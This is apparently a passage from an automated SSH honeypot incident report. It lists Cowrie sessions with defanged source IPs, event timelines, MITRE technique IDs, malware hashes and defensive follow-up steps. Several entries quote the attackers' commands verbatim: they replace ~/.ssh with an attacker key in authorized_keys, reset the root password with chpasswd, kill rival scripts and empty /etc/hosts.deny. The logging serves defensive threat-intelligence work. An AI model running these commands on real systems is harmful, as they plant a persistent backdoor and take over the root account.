| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 08:19:32` | `cowrie.session.connect` |
| `2026-05-17 08:19:32` | `cowrie.client.version` |
| `2026-05-17 08:19:32` | `cowrie.client.kex` |
| `2026-05-17 08:19:33` | `cowrie.login.success` |
| `2026-05-17 08:19:33` | `cowrie.session.params` |
| `2026-05-17 08:19:33` | `cowrie.command.input` |
| `2026-05-17 08:19:33` | `cowrie.command.failed` |
| `2026-05-17 08:19:33` | `cowrie.log.closed` |
| `2026-05-17 08:19:34` | `cowrie.session.params` |
| `2026-05-17 08:19:34` | `cowrie.command.input` |
| `2026-05-17 08:19:34` | `cowrie.session.file_download` |
| `2026-05-17 08:19:34` | `cowrie.log.closed` |
| `2026-05-17 08:19:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.202[.]48` to AbuseIPDB if not already reported
- [ ] Block `101.96.202[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7410dad26937

| Field | Detail |
|---|---|
| **Source IP** | `101.96.202[.]48` |
| **First Seen** | 2026-05-17 08:19 |
| **Last Seen** | 2026-05-17 08:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 08:19:36` | `cowrie.session.connect` |
| `2026-05-17 08:19:36` | `cowrie.client.version` |
| `2026-05-17 08:19:36` | `cowrie.client.kex` |
| `2026-05-17 08:19:36` | `cowrie.login.success` |
| `2026-05-17 08:19:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.202[.]48` to AbuseIPDB if not already reported
- [ ] Block `101.96.202[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6bb60eb963e

| Field | Detail |
|---|---|
| **Source IP** | `101.96.202[.]48` |
| **First Seen** | 2026-05-17 08:29 |
| **Last Seen** | 2026-05-17 08:29 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:XpfF5tbmzuyM"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 08:29:30` | `cowrie.session.connect` |
| `2026-05-17 08:29:30` | `cowrie.client.version` |
| `2026-05-17 08:29:30` | `cowrie.client.kex` |
| `2026-05-17 08:29:30` | `cowrie.login.success` |
| `2026-05-17 08:29:31` | `cowrie.session.params` |
| `2026-05-17 08:29:31` | `cowrie.command.input` |
| `2026-05-17 08:29:31` | `cowrie.command.failed` |
| `2026-05-17 08:29:31` | `cowrie.log.closed` |
| `2026-05-17 08:29:31` | `cowrie.session.params` |
| `2026-05-17 08:29:31` | `cowrie.command.input` |
| `2026-05-17 08:29:31` | `cowrie.session.file_download` |
| `2026-05-17 08:29:31` | `cowrie.log.closed` |
| `2026-05-17 08:29:45` | `cowrie.session.params` |
| `2026-05-17 08:29:45` | `cowrie.command.input` |
| `2026-05-17 08:29:45` | `cowrie.log.closed` |
| `2026-05-17 08:29:45` | `cowrie.session.params` |
| `2026-05-17 08:29:45` | `cowrie.command.input` |
| `2026-05-17 08:29:45` | `cowrie.log.closed` |
| `2026-05-17 08:29:46` | `cowrie.session.params` |
| `2026-05-17 08:29:46` | `cowrie.command.input` |
| `2026-05-17 08:29:46` | `cowrie.session.file_download` |
| `2026-05-17 08:29:46` | `cowrie.log.closed` |
| `2026-05-17 08:29:46` | `cowrie.session.params` |
| `2026-05-17 08:29:46` | `cowrie.command.input` |
| `2026-05-17 08:29:46` | `cowrie.log.closed` |
| `2026-05-17 08:29:47` | `cowrie.session.params` |
| `2026-05-17 08:29:47` | `cowrie.command.input` |
| `2026-05-17 08:29:47` | `cowrie.log.closed` |
| `2026-05-17 08:29:47` | `cowrie.session.params` |
| `2026-05-17 08:29:47` | `cowrie.command.input` |
| `2026-05-17 08:29:47` | `cowrie.command.input` |
| `2026-05-17 08:29:48` | `cowrie.log.closed` |
| `2026-05-17 08:29:48` | `cowrie.session.params` |
| `2026-05-17 08:29:48` | `cowrie.command.input` |
| `2026-05-17 08:29:48` | `cowrie.log.closed` |
| `2026-05-17 08:29:48` | `cowrie.session.params` |
| `2026-05-17 08:29:48` | `cowrie.command.input` |
| `2026-05-17 08:29:48` | `cowrie.log.closed` |
| `2026-05-17 08:29:49` | `cowrie.session.params` |
| `2026-05-17 08:29:49` | `cowrie.command.input` |
| `2026-05-17 08:29:49` | `cowrie.log.closed` |
| `2026-05-17 08:29:49` | `cowrie.session.params` |
| `2026-05-17 08:29:49` | `cowrie.command.input` |
| `2026-05-17 08:29:49` | `cowrie.log.closed` |
| `2026-05-17 08:29:49` | `cowrie.session.params` |
| `2026-05-17 08:29:49` | `cowrie.command.input` |
| `2026-05-17 08:29:50` | `cowrie.log.closed` |
| `2026-05-17 08:29:50` | `cowrie.session.params` |
| `2026-05-17 08:29:50` | `cowrie.command.input` |
| `2026-05-17 08:29:50` | `cowrie.log.closed` |
| `2026-05-17 08:29:50` | `cowrie.session.params` |
| `2026-05-17 08:29:50` | `cowrie.command.input` |
| `2026-05-17 08:29:50` | `cowrie.log.closed` |
| `2026-05-17 08:29:51` | `cowrie.session.params` |
| `2026-05-17 08:29:51` | `cowrie.command.input` |
| `2026-05-17 08:29:51` | `cowrie.log.closed` |
| `2026-05-17 08:29:51` | `cowrie.session.params` |
| `2026-05-17 08:29:51` | `cowrie.command.input` |
| `2026-05-17 08:29:51` | `cowrie.log.closed` |
| `2026-05-17 08:29:51` | `cowrie.session.params` |
| `2026-05-17 08:29:51` | `cowrie.command.input` |
| `2026-05-17 08:29:52` | `cowrie.log.closed` |
| `2026-05-17 08:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.202[.]48` to AbuseIPDB if not already reported
- [ ] Block `101.96.202[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90572a2498e4

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]26` |
| **First Seen** | 2026-05-17 08:42 |
| **Last Seen** | 2026-05-17 08:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 08:42:37` | `cowrie.session.connect` |
| `2026-05-17 08:42:37` | `cowrie.client.version` |
| `2026-05-17 08:42:37` | `cowrie.client.kex` |
| `2026-05-17 08:42:38` | `cowrie.login.success` |
| `2026-05-17 08:42:38` | `cowrie.session.params` |
| `2026-05-17 08:42:38` | `cowrie.command.input` |
| `2026-05-17 08:42:38` | `cowrie.command.failed` |
| `2026-05-17 08:42:38` | `cowrie.log.closed` |
| `2026-05-17 08:42:38` | `cowrie.session.params` |
| `2026-05-17 08:42:38` | `cowrie.command.input` |
| `2026-05-17 08:42:38` | `cowrie.session.file_download` |
| `2026-05-17 08:42:38` | `cowrie.log.closed` |
| `2026-05-17 08:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]26` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8343dc060f3

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]26` |
| **First Seen** | 2026-05-17 08:42 |
| **Last Seen** | 2026-05-17 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 08:42:40` | `cowrie.session.connect` |
| `2026-05-17 08:42:40` | `cowrie.client.version` |
| `2026-05-17 08:42:40` | `cowrie.client.kex` |
| `2026-05-17 08:42:41` | `cowrie.login.success` |
| `2026-05-17 08:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]26` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b96c8b16dd

| Field | Detail |
|---|---|
| **Source IP** | `43.153.93[.]68` |
| **First Seen** | 2026-05-17 08:44 |
| **Last Seen** | 2026-05-17 08:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 08:44:58` | `cowrie.session.connect` |
| `2026-05-17 08:44:58` | `cowrie.client.version` |
| `2026-05-17 08:44:58` | `cowrie.client.kex` |
| `2026-05-17 08:44:59` | `cowrie.login.success` |
| `2026-05-17 08:45:00` | `cowrie.session.params` |
| `2026-05-17 08:45:00` | `cowrie.command.input` |
| `2026-05-17 08:45:00` | `cowrie.command.failed` |
| `2026-05-17 08:45:01` | `cowrie.log.closed` |
| `2026-05-17 08:45:01` | `cowrie.session.params` |
| `2026-05-17 08:45:01` | `cowrie.command.input` |
| `2026-05-17 08:45:01` | `cowrie.session.file_download` |
| `2026-05-17 08:45:01` | `cowrie.log.closed` |
| `2026-05-17 08:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.93[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.93[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca79319dd6fa

| Field | Detail |
|---|---|
| **Source IP** | `43.153.93[.]68` |
| **First Seen** | 2026-05-17 08:45 |
| **Last Seen** | 2026-05-17 08:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 08:45:04` | `cowrie.session.connect` |
| `2026-05-17 08:45:04` | `cowrie.client.version` |
| `2026-05-17 08:45:04` | `cowrie.client.kex` |
| `2026-05-17 08:45:05` | `cowrie.login.success` |
| `2026-05-17 08:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.93[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.93[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-871a44211fa0

| Field | Detail |
|---|---|
| **Source IP** | `218.78.46[.]81` |
| **First Seen** | 2026-05-17 08:59 |
| **Last Seen** | 2026-05-17 08:59 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:dhNMDTHNQber"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 08:59:15` | `cowrie.session.connect` |
| `2026-05-17 08:59:16` | `cowrie.client.version` |
| `2026-05-17 08:59:17` | `cowrie.client.kex` |
| `2026-05-17 08:59:18` | `cowrie.login.success` |
| `2026-05-17 08:59:18` | `cowrie.session.params` |
| `2026-05-17 08:59:18` | `cowrie.command.input` |
| `2026-05-17 08:59:18` | `cowrie.command.failed` |
| `2026-05-17 08:59:18` | `cowrie.log.closed` |
| `2026-05-17 08:59:18` | `cowrie.session.params` |
| `2026-05-17 08:59:18` | `cowrie.command.input` |
| `2026-05-17 08:59:19` | `cowrie.session.file_download` |
| `2026-05-17 08:59:19` | `cowrie.log.closed` |
| `2026-05-17 08:59:27` | `cowrie.session.params` |
| `2026-05-17 08:59:27` | `cowrie.command.input` |
| `2026-05-17 08:59:27` | `cowrie.log.closed` |
| `2026-05-17 08:59:28` | `cowrie.session.params` |
| `2026-05-17 08:59:28` | `cowrie.command.input` |
| `2026-05-17 08:59:28` | `cowrie.log.closed` |
| `2026-05-17 08:59:28` | `cowrie.session.params` |
| `2026-05-17 08:59:28` | `cowrie.command.input` |
| `2026-05-17 08:59:28` | `cowrie.session.file_download` |
| `2026-05-17 08:59:28` | `cowrie.log.closed` |
| `2026-05-17 08:59:29` | `cowrie.session.params` |
| `2026-05-17 08:59:29` | `cowrie.command.input` |
| `2026-05-17 08:59:29` | `cowrie.log.closed` |
| `2026-05-17 08:59:29` | `cowrie.session.params` |
| `2026-05-17 08:59:29` | `cowrie.command.input` |
| `2026-05-17 08:59:29` | `cowrie.log.closed` |
| `2026-05-17 08:59:30` | `cowrie.session.params` |
| `2026-05-17 08:59:30` | `cowrie.command.input` |
| `2026-05-17 08:59:30` | `cowrie.command.input` |
| `2026-05-17 08:59:30` | `cowrie.log.closed` |
| `2026-05-17 08:59:30` | `cowrie.session.params` |
| `2026-05-17 08:59:30` | `cowrie.command.input` |
| `2026-05-17 08:59:30` | `cowrie.log.closed` |
| `2026-05-17 08:59:31` | `cowrie.session.params` |
| `2026-05-17 08:59:31` | `cowrie.command.input` |
| `2026-05-17 08:59:31` | `cowrie.log.closed` |
| `2026-05-17 08:59:31` | `cowrie.session.params` |
| `2026-05-17 08:59:31` | `cowrie.command.input` |
| `2026-05-17 08:59:31` | `cowrie.log.closed` |
| `2026-05-17 08:59:32` | `cowrie.session.params` |
| `2026-05-17 08:59:32` | `cowrie.command.input` |
| `2026-05-17 08:59:32` | `cowrie.log.closed` |
| `2026-05-17 08:59:32` | `cowrie.session.params` |
| `2026-05-17 08:59:32` | `cowrie.command.input` |
| `2026-05-17 08:59:32` | `cowrie.log.closed` |
| `2026-05-17 08:59:33` | `cowrie.session.params` |
| `2026-05-17 08:59:33` | `cowrie.command.input` |
| `2026-05-17 08:59:33` | `cowrie.log.closed` |
| `2026-05-17 08:59:33` | `cowrie.session.params` |
| `2026-05-17 08:59:33` | `cowrie.command.input` |
| `2026-05-17 08:59:33` | `cowrie.log.closed` |
| `2026-05-17 08:59:34` | `cowrie.session.params` |
| `2026-05-17 08:59:34` | `cowrie.command.input` |
| `2026-05-17 08:59:34` | `cowrie.log.closed` |
| `2026-05-17 08:59:34` | `cowrie.session.params` |
| `2026-05-17 08:59:34` | `cowrie.command.input` |
| `2026-05-17 08:59:34` | `cowrie.log.closed` |
| `2026-05-17 08:59:34` | `cowrie.session.params` |
| `2026-05-17 08:59:34` | `cowrie.command.input` |
| `2026-05-17 08:59:35` | `cowrie.log.closed` |
| `2026-05-17 08:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.46[.]81` to AbuseIPDB if not already reported
- [ ] Block `218.78.46[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44f9ebc5beb9

| Field | Detail |
|---|---|
| **Source IP** | `118.122.147[.]49` |
| **First Seen** | 2026-05-17 09:05 |
| **Last Seen** | 2026-05-17 09:05 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:p2NLo647DC4X"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 09:05:14` | `cowrie.session.connect` |
| `2026-05-17 09:05:14` | `cowrie.client.version` |
| `2026-05-17 09:05:14` | `cowrie.client.kex` |
| `2026-05-17 09:05:14` | `cowrie.login.success` |
| `2026-05-17 09:05:15` | `cowrie.session.params` |
| `2026-05-17 09:05:15` | `cowrie.command.input` |
| `2026-05-17 09:05:15` | `cowrie.command.failed` |
| `2026-05-17 09:05:15` | `cowrie.log.closed` |
| `2026-05-17 09:05:15` | `cowrie.session.params` |
| `2026-05-17 09:05:15` | `cowrie.command.input` |
| `2026-05-17 09:05:15` | `cowrie.session.file_download` |
| `2026-05-17 09:05:15` | `cowrie.log.closed` |
| `2026-05-17 09:05:33` | `cowrie.session.params` |
| `2026-05-17 09:05:33` | `cowrie.command.input` |
| `2026-05-17 09:05:33` | `cowrie.log.closed` |
| `2026-05-17 09:05:33` | `cowrie.session.params` |
| `2026-05-17 09:05:33` | `cowrie.command.input` |
| `2026-05-17 09:05:33` | `cowrie.log.closed` |
| `2026-05-17 09:05:34` | `cowrie.session.params` |
| `2026-05-17 09:05:34` | `cowrie.command.input` |
| `2026-05-17 09:05:34` | `cowrie.session.file_download` |
| `2026-05-17 09:05:34` | `cowrie.log.closed` |
| `2026-05-17 09:05:34` | `cowrie.session.params` |
| `2026-05-17 09:05:34` | `cowrie.command.input` |
| `2026-05-17 09:05:34` | `cowrie.log.closed` |
| `2026-05-17 09:05:35` | `cowrie.session.params` |
| `2026-05-17 09:05:35` | `cowrie.command.input` |
| `2026-05-17 09:05:35` | `cowrie.log.closed` |
| `2026-05-17 09:05:35` | `cowrie.session.params` |
| `2026-05-17 09:05:35` | `cowrie.command.input` |
| `2026-05-17 09:05:35` | `cowrie.command.input` |
| `2026-05-17 09:05:36` | `cowrie.log.closed` |
| `2026-05-17 09:05:36` | `cowrie.session.params` |
| `2026-05-17 09:05:36` | `cowrie.command.input` |
| `2026-05-17 09:05:36` | `cowrie.log.closed` |
| `2026-05-17 09:05:36` | `cowrie.session.params` |
| `2026-05-17 09:05:36` | `cowrie.command.input` |
| `2026-05-17 09:05:37` | `cowrie.log.closed` |
| `2026-05-17 09:05:37` | `cowrie.session.params` |
| `2026-05-17 09:05:37` | `cowrie.command.input` |
| `2026-05-17 09:05:37` | `cowrie.log.closed` |
| `2026-05-17 09:05:37` | `cowrie.session.params` |
| `2026-05-17 09:05:37` | `cowrie.command.input` |
| `2026-05-17 09:05:38` | `cowrie.log.closed` |
| `2026-05-17 09:05:38` | `cowrie.session.params` |
| `2026-05-17 09:05:38` | `cowrie.command.input` |
| `2026-05-17 09:05:38` | `cowrie.log.closed` |
| `2026-05-17 09:05:38` | `cowrie.session.params` |
| `2026-05-17 09:05:38` | `cowrie.command.input` |
| `2026-05-17 09:05:39` | `cowrie.log.closed` |
| `2026-05-17 09:05:39` | `cowrie.session.params` |
| `2026-05-17 09:05:39` | `cowrie.command.input` |
| `2026-05-17 09:05:39` | `cowrie.log.closed` |
| `2026-05-17 09:05:39` | `cowrie.session.params` |
| `2026-05-17 09:05:39` | `cowrie.command.input` |
| `2026-05-17 09:05:40` | `cowrie.log.closed` |
| `2026-05-17 09:05:40` | `cowrie.session.params` |
| `2026-05-17 09:05:40` | `cowrie.command.input` |
| `2026-05-17 09:05:40` | `cowrie.log.closed` |
| `2026-05-17 09:05:40` | `cowrie.session.params` |
| `2026-05-17 09:05:40` | `cowrie.command.input` |
| `2026-05-17 09:05:41` | `cowrie.log.closed` |
| `2026-05-17 09:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.147[.]49` to AbuseIPDB if not already reported
- [ ] Block `118.122.147[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b7e85462410

| Field | Detail |
|---|---|
| **Source IP** | `118.122.147[.]49` |
| **First Seen** | 2026-05-17 09:05 |
| **Last Seen** | 2026-05-17 09:05 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:KdCwXuUGjeXQ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
